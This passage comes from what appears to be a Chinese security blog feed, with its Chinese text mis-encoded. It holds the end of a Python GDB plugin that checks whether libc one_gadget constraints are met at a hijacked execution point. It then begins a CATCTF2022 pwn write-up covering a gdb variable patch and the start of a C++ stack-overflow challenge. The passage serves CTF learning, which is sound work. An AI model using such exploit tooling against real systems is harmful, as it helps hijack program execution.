class="line">    address = gdb.parse_and_eval(<span class="string">&quot;$&quot;</span> + register)</span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            value = gdb.selected_inferior().read_memory(address, <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            value = gdb.selected_inferior().read_memory(address, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">int</span>.from_bytes(value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_A</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;rsp &amp; 0xf == 0&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register)) &amp; <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_B</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;rcx == NULL&quot;&quot;&quot;</span></span><br><span class="line">    register=condition_list[<span class="number">0</span>]</span><br><span class="line">    calc_value=<span class="built_in">int</span>(get_register_value(register))</span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_C</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;(u16)[rbp] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    condition=condition_list[<span class="number">0</span>]</span><br><span class="line">    register=condition_list[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> condition == <span class="string">&quot;u16&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value_ptr(register))</span><br><span class="line">        <span class="keyword">if</span> calc_value == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        calc_value=calc_value &amp; <span class="number">0xffff</span></span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_D</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[[rbp-0x70]] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=re.findall(<span class="string">r&quot;\[(\w+)([+-])(\w+)&quot;</span>, condition_list[<span class="number">0</span>])</span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        calc_value = <span class="built_in">int</span>(get_register_value(register)) - <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span> - <span class="built_in">int</span>(operand,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        calc_value = <span class="built_in">int</span>(get_register_value(register)) + <span class="built_in">int</span>(operand,<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> calc_value == <span class="number">0</span> + <span class="built_in">int</span>(operand,<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">8</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">4</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">8</span>)</span><br><span class="line">            calc_value=<span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value, <span class="number">4</span>)</span><br><span class="line">            calc_value=<span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_E</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[r10] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    register=condition_list[<span class="number">0</span>]</span><br><span class="line">    calc_value =get_register_value_ptr(register)</span><br><span class="line">    <span class="keyword">if</span> calc_value == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">condition_equal_F</span>(<span class="params">condition_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;[esp+0x3c] == NULL&quot;&quot;&quot;</span></span><br><span class="line">    condition_list=condition_list[<span class="number">0</span>]</span><br><span class="line">    register,operator,operand=condition_list[<span class="number">0</span>],condition_list[<span class="number">1</span>],condition_list[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register) + <span class="built_in">int</span>(operand,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">        calc_value=<span class="built_in">int</span>(get_register_value(register) - <span class="built_in">int</span>(operand,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value,<span class="number">8</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> register[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">            calc_value = gdb.selected_inferior().read_memory(calc_value,<span class="number">4</span>)</span><br><span class="line">            calc_value = <span class="built_in">int</span>.from_bytes(calc_value, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> gdb.MemoryError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> calc_value == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">equal_judgement</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°æ¥å¤„ç† one_gadget ä¸­çš„ç­‰å¼åˆ¤æ–­ï¼Œæˆ‘ç›®å‰å‘ç° one_gadgetä¸­çš„ç­‰å¼ä¸€å…±æœ‰å…­ç§ç±»å‹ï¼ˆå¦‚ä¸‹ï¼‰</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;rsp &amp; 0xf == 0&quot;,</span></span><br><span class="line"><span class="string">    &quot;rcx == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;(u16)[rbp] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[[rbp-0x70]] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[r10] == NULL&quot;,</span></span><br><span class="line"><span class="string">    &quot;[esp+0x3c] == NULL&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    æˆ‘é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼æ¥è¯†åˆ«å‡ºè¿™å…­ç§æƒ…å†µï¼Œå¹¶å°†ä»–ä»¬çš„å…³é”®ä¿¡æ¯åŒ¹é…å‡ºæ¥ï¼Œå†è°ƒç”¨å…¶å¯¹åº”çš„å¤„ç†å‡½æ•°</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">    string(str): ç­‰å¼åˆ¤æ–­æ¡ä»¶çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ &quot;[esp+0x34] == NULL&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¿”å›å€¼ï¼š</span></span><br><span class="line"><span class="string">    (bool): å¦‚æœç­‰å¼æˆç«‹åˆ™è¿”å› True ä¸æˆç«‹åˆ™è¿”å› False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    judgement=[]</span><br><span class="line">    <span class="keyword">match</span>=[]</span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;(\w+)\s*(\&amp;)\s*(\w+)&quot;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_A(judgement)</span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&#x27;\((\w+)\)\[(\w+)\]&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_C(judgement)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&#x27;\[(.*?)\]&#x27;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(judgement[<span class="number">0</span>].split(<span class="string">&#x27;[&#x27;</span>)) &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> condition_equal_D(judgement)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">match</span> = re.findall(<span class="string">r&#x27;(\w+)\s*([+-])\s*(.*)&#x27;</span>, judgement[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                <span class="keyword">return</span> condition_equal_F(<span class="keyword">match</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;(\w+) == NULL&quot;</span>, string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_B(judgement)</span><br><span class="line"></span><br><span class="line">    judgement = re.findall(<span class="string">r&quot;\[(\w+)\] == NULL&quot;</span>,string)</span><br><span class="line">    <span class="keyword">if</span> judgement:</span><br><span class="line">        <span class="keyword">return</span> condition_equal_E(judgement)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">constraints</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°ä½œç”¨æ˜¯å°†ä¼ å…¥çš„æ¯ä¸€ç»„ one_gadget æŒ‰ç…§æ¡ä»¶è¿›è¡Œåˆ†ç±»ï¼Œç„¶åè°ƒç”¨æ›´å…·ä½“çš„å‡½æ•°è¿›è¡Œå¤„ç†</span></span><br><span class="line"><span class="string">    ç›®å‰æˆ‘è€ƒè™‘äº† one_gadget çš„ä¸‰ç§æƒ…å†µï¼Œåˆ†åˆ«æ˜¯ is writeable å’Œ is got address of libc ä»¥åŠå¯¹ç­‰å¼çš„åˆ¤æ–­</span></span><br><span class="line"><span class="string">    å¦‚æœä½¿ç”¨ l2 å‚æ•°çš„è¯ï¼Œä¼šæœ‰æ›´å¤šçš„æƒ…å†µï¼Œæˆ‘è®¤ä¸ºå®ƒä»¬æ¦‚ç‡æå°å¹¶ä¸”æ¡ä»¶è¿‡äºç¹å¤šï¼Œæ‰€ä»¥ç›®å‰æ²¡æœ‰å¯¹å®ƒä»¬è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line"><span class="string">    å¦‚æœä¹‹åæœ‰æ¡ä»¶æ²¡æœ‰è€ƒè™‘åˆ°éœ€è¦æ·»åŠ çš„ï¼Œæˆ–è€…æƒ³å¤„ç† l2 çš„ one_gadget åˆ™åœ¨è¿™é‡Œæ·»åŠ æ–°çš„å‡½æ•°</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">    constraints(list):å­˜å‚¨çš„æ˜¯ä¸€ç»„çš„ one_gadget æ‰€æœ‰ä¿¡æ¯</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    è¿”å›å€¼ï¼š</span></span><br><span class="line"><span class="string">    (bool)å¦‚æœå½“å‰è¿™ç»„ one_gadget çš„æ‰€æœ‰æ¡ä»¶éƒ½æˆç«‹è¿”å› True åä¹‹æœ‰ä¸€ä¸ªæ¡ä»¶æ²¡æœ‰æ»¡è¶³å°±è¿”å› False</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    result1 = []</span><br><span class="line">    <span class="keyword">for</span> constraint <span class="keyword">in</span> constraints:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is writable&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(is_writeable_check(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;is the GOT address of libc&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(is_got_address_of_libc(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;||&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> constraint.split(<span class="string">&#x27;||&#x27;</span>):</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;== 0&quot;</span> <span class="keyword">in</span> i <span class="keyword">or</span> <span class="string">&quot;== NULL&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    result1.append(equal_judgement(i))</span><br><span class="line">            result.append(<span class="built_in">any</span>(result1))</span><br><span class="line">            result1 = []</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;== 0&quot;</span> <span class="keyword">in</span> constraint <span class="keyword">or</span> <span class="string">&quot;== NULL&quot;</span> <span class="keyword">in</span> constraint:</span><br><span class="line">            result.append(equal_judgement(constraint))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;one_gadget---&gt;&#x27;</span>, result, constraints)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_gadget_cmd</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è¯¥å‡½æ•°ä¸º check_gadget å‘½ä»¤çš„ä¸»å‡½æ•°</span></span><br><span class="line"><span class="string">    è¯¥å‘½ä»¤å®ç°äº†å¯¹å½“å‰ä½ç½®æ¦‚ç‡ç•¥é«˜çš„ one_gadget èƒ½å¦ç”Ÿæ•ˆåšäº†åˆ¤æ–­</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    å‘½ä»¤ä½¿ç”¨æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="string">    å¦‚æœä½ æƒ³åˆ¤æ–­åŠ«æŒæ‰§è¡Œæµçš„è¿™ä¸ªä½ç½®æ˜¯å¦æœ‰ one_gadget èƒ½å¤Ÿç”Ÿæ•ˆï¼Œé‚£ä¹ˆä½¿ç”¨ gdb è°ƒè¯•åˆ°åŠ«æŒæ‰§è¡Œæµçš„åœ°å€å¤„</span></span><br><span class="line"><span class="string">    ä½¿ç”¨è¯¥å‘½ä»¤å°±å¯ä»¥çœ‹åˆ°æ˜¯å¦æœ‰ one_gadget èƒ½ç”¨äº†</span></span><br><span class="line"><span class="string">    ç›®å‰åªèƒ½åˆ¤æ–­æ¦‚ç‡è¾ƒé«˜çš„ one_gadget èƒ½å¦ä½¿ç”¨ï¼Œæ— æ³•å¯¹ -l2 æ˜¾ç¤ºå‡ºæ¥çš„ one_gadget è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    check_gadget_cmd() å‡½æ•°æ— å‚ä¸”æ— è¿”å›å€¼</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    libc_path=get_libc_path()    </span><br><span class="line">    all_gadget_info=get_gadget_info(libc_path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(all_gadget_info)):</span><br><span class="line">        gadget_address,gadget_constraints=all_gadget_info[i][<span class="number">0</span>],all_gadget_info[i][<span class="number">1</span>]</span><br><span class="line">        result=check(gadget_constraints)</span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n\033[1;31m&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">120</span>+<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;Successful one_gadget&quot;</span>+<span class="string">&quot;\033[0m&quot;</span>,<span class="string">&quot;\033[1;31m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;gadget_address-------&gt;&quot;</span>+<span class="string">&quot;\033[0m\t\t&quot;</span>,<span class="string">&quot;\033[1;32m&quot;</span>+gadget_address+<span class="string">&quot;\033[0m&quot;</span>,<span class="string">&quot;\033[1;31m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;gadget_info----------&gt;&quot;</span>+<span class="string">&quot;\033[0m\t\t&quot;</span>,<span class="string">&quot;\033[1;32m&quot;</span>+<span class="built_in">str</span>(gadget_constraints)+<span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[1;31m&quot;</span>+<span class="string">&quot;=&quot;</span>*<span class="number">120</span>+<span class="string">&quot;\033[0m\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&quot;define check_gadget\n\tpython check_gadget_cmd()\nend&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å°è¯•å¼€å‘å°å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> å°å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CATCTF2022_pwnå¤ç°</title>
      <link href="/posts/74f96fff.html"/>
      <url>/posts/74f96fff.html</url>
      
        <content type="html"><![CDATA[<h2 id="welcome-CAT-CTF"><a href="#welcome-CAT-CTF" class="headerlink" title="welcome_CAT_CTF"></a>welcome_CAT_CTF</h2><p>è¿è¡Œç¨‹åºï¼Œå‘ç°æ˜¯ä¸€ä¸ªå°æ¸¸æˆï¼Œå¯ä»¥ä¸Šä¸‹å·¦å³æ¥ç§»åŠ¨ <code>@</code> è¿™ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ç¨‹åºè¿è¡Œä¹‹åˆè¯¢é—®äº†æœåŠ¡å™¨çš„ IP å’Œç«¯å£ã€‚</p><p>çœ‹ä¼ªä»£ç çš„è¿™é‡Œ(å¦‚ä¸‹)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301041745431.png"></p><p>å¦‚æœèƒ½è¿›å…¥æ­¤å¤„çš„ if ï¼Œé‚£ä¹ˆå°±å¯ä»¥è·å–åˆ°æœåŠ¡å™¨ä¸Šçš„ <code>flag</code> ï¼Œæ¡ä»¶æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªæ˜¯æ»¡è¶³<code>s[100 * v0 - 100 + v1] == &amp;unk_963B</code> è¿™ä¸ªåé¢çš„å…¶å®å°±æ˜¯å­—ç¬¦ <code>@</code> ã€‚</p><p>è€Œåœ¨æŒ‰ä¸‹ <code>w</code> é”®ï¼Œè¿›è¡Œçš„æ“ä½œå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">char</span> *)s[<span class="number">100</span> * v0 - <span class="number">100</span> + v1] == <span class="string">&quot; &quot;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s[<span class="number">100</span> * v0-- + v1] = (__int64)<span class="string">&quot; &quot;</span>;</span><br><span class="line">    s[<span class="number">100</span> * v0 + v1] = (__int64)&amp;unk_963B;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§é€»è¾‘å¯ä»¥çŒœæµ‹ï¼ŒæŒ‰ä¸‹ <code>w</code> æ˜¯å‘ä¸Šç§»åŠ¨ï¼Œè€Œå‘ä¸Šç§»åŠ¨çš„å‰æè‚¯å®šæ˜¯ä¸Šé¢çš„é‚£ä¸ªå†…å­˜è¦æ˜¯ç©ºæ ¼ï¼Œä¸ç„¶å½“å‰ <code>@</code> ä¸Šé¢æœ‰å­—ç¬¦æ˜¯æ— æ³•å‘ä¸Šç§»åŠ¨çš„(å¯ä»¥ç»“åˆç¨‹åºè¿è¡Œå‘ç°è¿™ä¸€ç‚¹)ï¼Œæ‰€ä»¥å¯ä»¥çŒœæµ‹ <code>s[100 * v0 - 100 + v1]</code>æŒ‡å‘çš„å°±æ˜¯å½“å‰å­—ç¬¦ <code> @</code> çš„ä¸Šä¸€ä¸ªæ ¼å­ï¼Œå› æ­¤è·å– <code>flag</code> çš„é‚£ä¸ª if å‰é¢çš„åˆ¤æ–­å°±æ˜¯éœ€è¦å½“å‰ <code>@</code> ä¸Šé¢çš„æ ¼å­é‡Œä¹Ÿæ˜¯ä¸€ä¸ª <code>@</code>ï¼Œå®ç°è¿™ä¸€ç‚¹åªéœ€è¦ç®€å•çš„ <code>adws</code>æ¥ç§»åŠ¨å³å¯ã€‚</p><p>è€Œç¨‹åºæ­£å¸¸è¿è¡Œçš„è¯æ— è®ºå¦‚ä½•ä¹Ÿæ— æ³•è®© <code>glod</code> è¿™ä¸ªå˜é‡å¤§äº <code>100000000</code> ï¼Œè€Œè·å– <code>flag</code> çš„æ–¹å¼åªè¦æ˜¯è¿›å…¥è¿™ä¸ª if åˆ¤æ–­å°±å¯ä»¥è·å–ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ <code>gdb</code> ä¸­çš„ <code>set</code> å‘½ä»¤ä¿®æ”¹å˜é‡çš„å€¼ï¼Œä»è€Œç»•è¿‡æ£€æŸ¥ã€‚</p><p>æ€»ç»“ä¸€ä¸‹å°±æ˜¯å…ˆç”¨ <code>gdb</code> ä¿®æ”¹ <code>glod</code> è¿™ä¸ªå…¨å±€å˜é‡å¤§äº <code>100000000</code> ï¼Œæ¥ç€è®© <code>@</code> ç§»åŠ¨åˆ° <code>@</code>ä¸‹é¢ï¼Œç„¶åæŒ‰ä¸‹ <code>j</code> (å› ä¸ºè·å– <code>flag</code> çš„é‚£ä¸ª if æ¡ä»¶æ˜¯åœ¨ <code>case: â€˜jâ€™</code> ä¸‹é¢çš„) å³å¯è·å–flag</p><h2 id="bitcoin"><a href="#bitcoin" class="headerlink" title="bitcoin"></a>bitcoin</h2><p>è¿™é¢˜å½“æ—¶å°±æ‰«äº†ä¸€çœ¼ï¼Œä¸€çœ‹æ˜¯ <code>C++</code> çš„é¢˜ç›®ç›´æ¥è·‘è·¯äº†ï¼Œä¸è¿‡æ¯”èµ›å®Œäº†ä¹‹åå…¥é—¨äº†ä¸€ä¸‹ <code>C++</code> æ‰€ä»¥ç°åœ¨æ­£æ‰¾ <code>C++</code> çš„é¢˜ç›®ç»ƒç»ƒæ‰‹å‘¢ï¼ˆ <code>winmt</code> å¸ˆå‚…å‡ºçš„é‚£ä¸ªé™¤å¤–ï¼Œå®åœ¨æ„Ÿè§‰å¤ªéš¾è¾£ï¼Œå¦‚æœæœ‰å¯èƒ½çš„è¯æ”¾åˆ°æœ€åå¤ç°ï¼Œå¦‚æœæ²¡å¯èƒ½çš„è¯å°±è·‘è·¯äº† QAQ ï¼‰ï¼Œè¿™é“é¢˜å…¶å®ä¸€ç‚¹ä¹Ÿä¸éš¾ï¼Œå°±æ˜¯ä¸€ä¸ªå¸¸è§„çš„æ ˆæº¢å‡ºï¼Œä¸è¿‡ <code>C++</code> å†™çš„ç¨‹åºï¼Œç¡®å®è·Ÿä¹‹å‰åšçš„å¸¸è§„æ ˆæº¢å‡ºè¿˜æœ‰ä¸€ç‚¹ä¸å¤ªä¸€æ ·ã€‚</p><p>å…³äº <code>C++</code> é›¶åŸºç¡€å…¥é—¨ï¼Œä»é›¶åˆ°é›¶ç‚¹ä¸€çš„è¯ï¼Œå¯ä»¥çœ‹è¿™ç¯‡<a href="https://zikh26.github.io/posts/4320fd7a.html">æ–‡ç« </a></p><h4 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112149112.png" alt="image-20230111214911908" style="zoom: 67%;" /><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112154233.png" alt="image-20230111215447098" style="zoom:50%;" /><h4 id="æ¼æ´æ‰€åœ¨ï¼š"><a href="#æ¼æ´æ‰€åœ¨ï¼š" class="headerlink" title="æ¼æ´æ‰€åœ¨ï¼š"></a>æ¼æ´æ‰€åœ¨ï¼š</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301112158735.png" alt="image-20230111215853664" style="zoom:50%;" /><p>å› 